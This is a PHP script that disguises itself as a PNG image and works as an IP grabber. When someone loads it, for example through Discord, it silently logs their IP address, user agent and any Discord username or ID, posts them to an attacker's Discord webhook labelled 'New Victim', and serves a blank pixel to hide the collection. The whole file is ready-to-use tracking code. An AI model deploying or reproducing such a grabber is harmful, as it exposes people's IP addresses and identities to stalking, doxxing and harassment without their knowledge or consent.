<?php
header('Content-Type: image/png');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

$ip       = $_SERVER['REMOTE_ADDR'];
$ua       = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time     = gmdate("Y-m-d H:i:s");

// Try to get Discord username + ID from UA
$username = "Unknown";
$user_id  = "Unknown";
if (preg_match('/\(([^)]+)\)/', $ua, $m)) {
    if (strpos($m[1], '#') !== false) {
        $username = explode('#', $m[1])[0];
    }
}
if (preg_match('/\b\d{17,20}\b/', $ua, $m)) $user_id = $m[1];

// Replace with your webhook
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";

$payload = json_encode([
    "content" => "**Broken Image Clicked**",
    "embeds" => [[
        "title" => "New Victim",
        "color" => 16711680,
        "fields" => [
            ["name" => "IP", "value" => "||$ip||", "inline" => true],
            ["name" => "Username", "value" => $username, "inline" => true],
            ["name" => "User ID", "value" => "||$user_id||", "inline" => true],
            ["name" => "Time", "value" => $time]
        ]
    ]]
]);

$ch = curl_init($webhook);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true
]);
curl_exec($ch);
curl_close($ch);

// Send 1x1 transparent pixel → Discord shows infinite loading spinner
echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
?>
